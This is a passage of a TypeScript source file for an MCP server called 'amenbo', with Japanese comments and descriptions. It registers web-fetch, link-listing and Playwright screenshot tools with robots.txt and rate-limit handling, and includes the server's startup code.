      max_tokens: z.number().int().positive().optional().describe("1ページの概算トークン上限(既定8000)"),
      force_full: z.boolean().optional().describe("既定false。trueで差分応答(unchanged/diff)と定型ブロック除去を無効化し常に全文を返す"),
    },
  },
  async ({ url, mode, selector, section, page, max_tokens: maxTokens, force_full: forceFull }) => {
    try {
      const content = await handleFetchTool({ url, mode, selector, section, page, max_tokens: maxTokens, force_full: forceFull });
      return { content };
    } catch (error) {
      const message = error instanceof AmenboError ? error.message : `予期しないエラーが発生しました: ${String(error)}`;
      if (!(error instanceof AmenboError)) {
        console.error(error);
      }
      return { content: [{ type: "text" as const, text: message }], isError: true };
    }
  },
);

server.registerTool(
  "links",
  {
    title: "List links from a page (sitemap/RSS-first)",
    description: "sitemap.xml/RSS・Atomフィードがあれば優先し、無ければページ内リンクを抽出する低負荷なリンク列挙。",
    inputSchema: {
      url: z.string().url().describe("起点URL"),
      filter: z.string().optional().describe("URL/リンクテキストの部分一致、または*を使ったglob"),
    },
  },
  async ({ url, filter }) => {
    try {
      const result = await discoverLinks(url, politeness, filter ? { filter } : {});
      return { content: [{ type: "text" as const, text: formatLinksResponse(url, result) }] };
    } catch (error) {
      const message = error instanceof AmenboError ? error.message : `予期しないエラーが発生しました: ${String(error)}`;
      if (!(error instanceof AmenboError)) {
        console.error(error);
      }
      return { content: [{ type: "text" as const, text: message }], isError: true };
    }
  },
);

server.registerTool(
  "screenshot",
  {
    title: "Capture a tiled screenshot of a web page",
    description: "明示的な視覚確認用。Playwrightでページをレンダリングし、タイル分割したPNGスクリーンショットを返す。robots.txt/レート制御/キャッシュを内蔵する。",
    inputSchema: {
      url: z.string().url().describe("撮影対象のURL(http/httpsのみ)"),
      fullPage: z.boolean().optional().describe("既定true。falseの場合は最初のビューポート分(1タイル)のみ撮影する"),
      width: z.number().int().positive().optional().describe("タイル幅(px)。既定1280"),
      scale: z.number().min(0.5).max(1.0).optional().describe("解像度スケール(0.5〜1.0、既定1.0)。小さいほど画像サイズ(トークン)が減る"),
    },
  },
  async ({ url, fullPage, width, scale }) => {
    try {
      const screenshot = await resolveScreenshot(url, {
        fullPage: fullPage ?? true,
        width: width ?? DEFAULT_TILE_WIDTH,
        scale: scale ?? DEFAULT_SCREENSHOT_SCALE,
      });
      return { content: buildScreenshotContent({ title: null }, screenshot, null) };
    } catch (error) {
      const message = error instanceof AmenboError ? error.message : `予期しないエラーが発生しました: ${String(error)}`;
      if (!(error instanceof AmenboError)) {
        console.error(error);
      }
      return { content: [{ type: "text" as const, text: message }], isError: true };
    }
  },
);

async function main(): Promise<void> {
  const transport = new StdioServerTransport();
  await server.connect(transport);
}

/**
 * このモジュールが直接実行された(node dist/server.js / tsx src/server.ts / binエントリ経由)場合のみ
 * trueを返す。テスト(vitest)がformatHandoffResponse等のユニットテストのためにこのファイルを
 * importした際、stdioトランスポート接続(main())が誤って走ってテストプロセスがハングするのを防ぐ。
 */
function isDirectlyExecuted(): boolean {
  return typeof process.argv[1] === "string" && fileURLToPath(import.meta.url) === process.argv[1];
}

if (isDirectlyExecuted()) {
  main().catch((error: unknown) => {
    console.error("amenboサーバーの起動に失敗しました:", error);
    process.exit(1);
  });
}
